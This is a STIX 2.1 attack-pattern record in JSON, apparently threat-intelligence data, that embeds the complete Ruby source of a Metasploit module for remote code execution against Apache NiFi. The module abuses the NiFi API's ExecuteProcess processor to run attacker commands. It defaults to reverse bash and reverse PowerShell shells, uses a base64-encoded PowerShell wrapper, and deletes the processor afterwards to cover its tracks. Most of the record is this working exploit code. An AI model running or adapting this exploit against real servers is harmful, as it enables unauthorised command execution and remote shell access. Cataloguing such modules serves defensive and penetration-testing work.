{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3057f53d-eacd-4e92-ab3e-4fd593ec52de",
    "created": "2024-08-14T17:11:37.077888Z",
    "modified": "2024-08-14T17:11:37.077893Z",
    "name": "Apache NiFi API Remote Code Execution",
    "description": " This module uses the NiFi API to create an ExecuteProcess processor that will execute OS commands. The API must be unsecured (or credentials provided) and the ExecuteProcess processor must be available. An ExecuteProcessor processor is created then is configured with the payload and started. The processor is then stopped and deleted.  Verified against 1.12.1, 1.12.1-RC2, and 1.20.0  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_nifi_processor_rce.rb",
            "external_id": "apache_nifi_processor_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://nifi.apache.org/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/apache/nifi"
        },
        {
            "source_name": "reference",
            "url": "https://nifi.apache.org/docs/nifi-docs/components/org.apache.nifi/nifi-standard-nar/1.12.1/\\"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Potential Improvements:\n# Add option to authenticate using client certificate\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Nifi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache NiFi API Remote Code Execution',\n        'Description' => %q{\n          This module uses the NiFi API to create an ExecuteProcess processor that will execute OS commands. The API must\n          be unsecured (or credentials provided) and the ExecuteProcess processor must be available. An ExecuteProcessor\n          processor is created then is configured with the payload and started. The processor is then stopped and\n          deleted.\n\n          Verified against 1.12.1, 1.12.1-RC2, and 1.20.0\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Graeme Robinson'],\n        'References' => [\n          ['URL', 'https://nifi.apache.org/'],\n          ['URL', 'https://github.com/apache/nifi'],\n          [\n            'URL', 'https://nifi.apache.org/docs/nifi-docs/components/org.apache.nifi/nifi-standard-nar/1.12.1/' \\\n                  'org.apache.nifi.processors.standard.ExecuteProcess/index.html'\n          ]\n        ],\n        'DisclosureDate' => '2020-10-03',\n        'DefaultOptions' => { 'RPORT' => 8080 },\n        'Platform' => %w[unix linux macos win],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'Payload' => { 'BadChars' => '\"' },\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Windows (In-Memory)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :win_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/reverse_powershell' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],\n          'NOCVE' => ['abusing a feature']\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptInt.new('DELAY', [\n          true,\n          'The delay (s) before stopping and deleting the processor',\n          5 # 2 seems enough in my lab, but set to 5 for safety\n        ])\n      ],\n      self.class\n    )\n  end\n\n  def configure_processor(command)\n    cmd = command.split(' ', 2)\n    body = {\n      'component' => {\n        'config' => {\n          'autoTerminatedRelationships' => ['success'],\n          'properties' => { 'Command' => cmd[0], 'Command Arguments' => cmd[1] },\n          'schedulingPeriod' => '3600 sec'\n        },\n        'id' => @processor,\n        'state' => 'RUNNING'\n      },\n      'revision' => { 'clientId' => 'x', 'version' => 1 }\n    }\n    opts = {\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', @processor),\n      'ctype' => 'application/json',\n      'data' => body.to_json\n    }\n    opts['headers'] = { 'Authorization' => \"Bearer #{@token}\" } if @token\n    res = send_request_cgi(opts)\n    fail_with(Failure::Unreachable, 'No response received') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Unexpected HTTP response code received #{res.code}\") unless res.code == 200\n  end\n\n  def check\n    # As far as I can tell from the API documentation, it's not possible to check whether the required permissions are\n    # present unless \"permission to check permissions\" is granted. For this reason it reports:\n    # * \"Unknown\" if a timeout is experienced when checking whether login is required\n    # * \"Safe\" if the response to the login check is not one of the two expected responses because it's probably not\n    #      NiFi\n    # * \"Detected\" if login is required, because it has confirmed that NiFi is running on the port becuase it got an\n    #      expected response\n    # * \"Appears\" if login is not required because it has confirmed that Nifi is running because it got the expected\n    #      response and if there is no authentication then there is no way of restricting the ExecuteCode permimssion\n\n    @cleanup_required = false\n\n    login_type = supports_login?\n\n    return CheckCode::Unknown('Unable to determine if logins are supported') if login_type.nil?\n\n    if login_type\n      return CheckCode::Appears('Apache NiFi instance supports logins')\n    end\n\n    CheckCode::Detected('Apache NiFi instance does not support logins')\n  end\n\n  def validate_config\n    if datastore['BEARER-TOKEN'].to_s.empty? && datastore['USERNAME'].to_s.empty?\n      fail_with(Failure::BadConfig,\n                'Authentication is required. Bearer-Token or Username and Password must be specified')\n    end\n  end\n\n  def cleanup\n    super\n    return unless @cleanup_required\n\n    # Wait for thread to execute - This seems necesarry, especially on Windows\n    # and there is no way I can see of checking whether the thread has executed\n    print_status(\"Waiting #{datastore['DELAY']} seconds before stopping and deleting\")\n    sleep(datastore['DELAY'])\n\n    # Stop Processor\n    begin\n      stop_processor(@token, @processor)\n    rescue ProcessorError\n      fail_with(Failure::UnexpectedReply, 'Unable to stop processor. Manual cleanup is required')\n    end\n    vprint_good(\"Stopped and terminated processor #{@processor}\")\n\n    # Delete processor\n    begin\n      delete_processor(@token, @processor, 3)\n    rescue ProcessorError\n      fail_with(Failure::UnexpectedReply, 'Unable to stop processor. Manual cleanup is required')\n    end\n    vprint_good(\"Deleted processor #{@processor}\")\n  end\n\n  def exploit\n    # Check whether login is required and set/fetch token\n    if supports_login?\n      validate_config\n      @token = if datastore['BEARER-TOKEN'].to_s.empty?\n                 retrieve_login_token\n               else\n                 datastore['BEARER-TOKEN']\n               end\n      fail_with(Failure::NoAccess, 'Invalid Credentials') if @token.nil?\n    else\n      @token = nil\n    end\n\n    # Retrieve root process group\n    process_group = fetch_root_process_group(@token)\n    fail_with(Failure::UnexpectedReply, 'Unable to retrieve root process group') if process_group.nil?\n    vprint_good(\"Retrieved process group: #{process_group}\")\n\n    @cleanup_required = true\n\n    # Create processor in root process group\n    begin\n      @processor = create_processor(@token, process_group)\n      fail_with(Failure::UnexpectedReply, 'Unable to create a new processor') if @processor.nil?\n    rescue ProcessorError\n      fail_with(Failure::UnexpectedReply,\n                'Unable to create processor. Manual review of HTTP packets will be required to debug failure.')\n    end\n    vprint_good(\"Created processor #{@processor} in process group #{process_group}\")\n\n    # Generate command\n    case target['Type']\n    when :unix_memory\n      cmd = \"bash -c \\\"#{payload.encoded}\\\"\"\n    when :win_memory\n      # This is a bit hacky because double quotes are processed and removed by the NiFi ExecuteCommand processor. See\n      # below for why BadChars didn't cut it. The solution used is to wrap up command in a cmd /C \"payload\" command and\n      # use powershell's Stop-parsing token (--%) to remove the need to perform any escaping of metacharacter. This\n      # command is then base64 encoded and run with -e/-EncodedCommand. This allows commands including double quotes and\n      # dollar signs (etc.) to be passed to cmd.exe\n      #\n      # This method was chosen rather than using\n      #   BadChars => '\"'\n      # with\n      #   cmd /C \"#{payload.encoded}\"\n      # because commands such as\n      #   echo x^\"x >%tmp%\\x\n      # did not work with the BadChars method (\"^\" is the cmd.exe escape char)\n      enc_cmd = Base64.strict_encode64(\"cmd /C --% #{payload.encoded}\".encode('UTF-16LE'))\n      cmd = \"powershell.exe -e #{enc_cmd}\"\n    end\n    vprint_status(\"Using command #{cmd}\")\n\n    # Configure processor and run command\n    configure_processor(cmd)\n    vprint_good(\"Configured processor #{@processor} and ran command\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}